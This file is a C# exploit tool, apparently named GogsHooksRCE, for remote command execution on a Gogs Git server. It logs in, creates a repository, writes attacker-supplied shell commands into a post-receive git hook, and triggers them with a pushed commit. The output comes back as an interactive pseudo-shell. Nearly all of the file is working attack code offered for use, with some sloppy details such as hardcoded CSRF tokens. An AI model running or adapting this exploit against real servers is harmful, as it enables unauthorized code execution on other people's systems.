using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace GogsHooksRCE
{
    class Program
    {
        private static HttpClient client;
        private static HttpClientHandler handler;

        public static HttpClient GetHttpClient()
        {
            if (client == null)
            {
                handler = new HttpClientHandler();
                handler.CookieContainer = new System.Net.CookieContainer();
                client = new HttpClient(handler);
            }
            return client;
        }

        public static class Global
        {
            public static string contentType = "application/x-www-form-urlencoded";

        }
        public static async Task<string> RequestLogin(string gogsUrl, string user, string pass)
        {
            try
            {
                HttpClient client = GetHttpClient();
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{gogsUrl}/user/login");
                request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0");
                string content = $"_csrf=dDmECyF4hq0M5np3hiSK430fcpQ6MTczNzc3NDE4NTc3ODU0OTgwMg&user_name={user}&password={Uri.EscapeDataString(pass)}";
                request.Content = new StringContent(content);
                request.Content.Headers.ContentType = new MediaTypeHeaderValue(Global.contentType);
                HttpResponseMessage response = await client.SendAsync(request);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                return responseBody;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while logging in: "+ex.Message);
                Environment.Exit(1);
                return null;
            }
        }
        public static async Task<string> CreateRepo(string gogsUrl)
        {
            try
            {
                HttpClient client = GetHttpClient();
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, gogsUrl+"/repo/create");
                request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0");
                string content = "_csrf=93sllJG84HO-huP-MTcJANhvUoQ6MTczNzc3Nzc5NjYyNjA2NDQ4MQ&user_id=1&repo_name=tristao&description=&gitignores=&license=&readme=Default";
                request.Content = new StringContent(content);
                request.Content.Headers.ContentType = new MediaTypeHeaderValue(Global.contentType);
                HttpResponseMessage response = await client.SendAsync(request);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                return responseBody;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while creating repository: "+ex.Message);
                Environment.Exit(1);
                return null;

            }
        }

        public static async Task<string> CreateHook(string gogsUrl, string pUser, string command)
        {
            try
            {
                HttpClient client = GetHttpClient();
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, gogsUrl+"/"+pUser+"/tristao/settings/hooks/git/post-receive");
                request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0");
                string content = "_csrf=ZwIIahKGbJqTa_DR2zOCZ_8byOI6MTczNzc3ODMyODk5MDY1NzIwNg&content=%23%21%2Fbin%2Fsh%0D%0A"+command;
                request.Content = new StringContent(content);
                request.Content.Headers.ContentType = new MediaTypeHeaderValue(Global.contentType);
                HttpResponseMessage response = await client.SendAsync(request);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                return responseBody;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while creating Hook: "+ex.Message);
                return null;
                Environment.Exit(1);
            }
        }

        public static void CloneRepo(string pRepoUrl, string localPath, string pUser, string pPass)
        {
            string gitPath = "git";
            string command = "clone http://"+pPass+":"+pPass+"@"+pRepoUrl+" " + localPath;
            RunCommand(gitPath, command);
        }

        public static void RunGitCommand(string localPath, string command)
        {
            string gitPath = "git"; 
            RunCommand(gitPath, $"-C {localPath} {command}");
        }

        public static void RunCommand(string executable, string arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = executable,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            try
            {
                Process process = Process.Start(startInfo);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (error.Contains("remote:"))
                {
                    string[] lines = error.Split("To http");
                    foreach (string line in lines)
                    {
                        if (line.Contains("remote"))
                        {
                            Console.Write(line.Replace("remote: ", ""));
                        }
                    }
                }
                
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error while executing command: "+ex.Message);
                Environment.Exit(1);
            }
        }

        static void Main(string[] args)
        {
            Console.Write("Enter the url Gogs format:");
            string gogsUrl = Console.ReadLine();
            string[] hostname = gogsUrl.Split("/", StringSplitOptions.RemoveEmptyEntries);
            Console.Write("Enter the Gogs user:");
            string username = Console.ReadLine();
            Console.Write("Enter the password:");
            string password = Console.ReadLine();
            string encodedPassword = Uri.EscapeDataString(password);
            string repoUrl = hostname[1]+"/" + username+"/tristao.git";
            Console.WriteLine("Logging in...");
            string token = RequestLogin(gogsUrl, username, password).Result;
            Console.WriteLine("Creating Repository...");
            string createRepoRequest = CreateRepo(gogsUrl).Result;
            string localPath = "tristao";
            Console.WriteLine("Clone Repository...");
            CloneRepo(repoUrl, localPath, username, encodedPassword);
            string sair = null;
            while (sair != "x")
            {
                Console.Write(username+ "@gogs:~$ ");
                string command = Console.ReadLine();
                
                string createGitHook = CreateHook(gogsUrl, username, command).Result;
                File.Create(localPath + "\\isolda.txt").Close();
                Random content = new Random();
                int randomNumber = content.Next(0, 10000000);
                File.WriteAllText(localPath + "\\isolda.txt", randomNumber.ToString());
                RunGitCommand(localPath, "add .");
                RunGitCommand(localPath, "commit -m \"Add isolda\"");
                RunGitCommand(localPath, "push");
                File.Delete(localPath + "\\isolda.txt");
                sair = command;
            }
        }
    }
}
